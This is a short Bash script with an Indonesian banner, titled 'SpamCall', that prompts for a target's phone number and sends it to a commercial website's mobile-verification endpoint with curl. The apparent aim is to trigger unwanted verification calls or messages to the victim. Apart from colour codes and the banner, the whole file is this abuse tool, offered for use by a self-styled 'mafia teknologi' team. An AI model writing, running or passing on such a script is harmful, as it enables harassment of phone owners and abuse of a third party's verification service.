#!/bin/bash
# code warna
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
# penghapus teks
clear
# tampilan
echo -e "$green"
figlet SpamCall
echo -e "        author : panglima jateng" | lolcat
echo -e "        team : mafia teknologi" | lolcat
echo -e "        script : spam call" | lolcat
echo -e "     ==============================" | lolcat
echo -e "Gunakan Dengan Bijak" | lolcat
echo -e "××××××××××××××××××××××××××××××××××××××××" | lolcat
echo -e "masukan kontak target contoh 88097653376" | lolcat
read -p "=> " nomor
echo -e "$yellow"
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
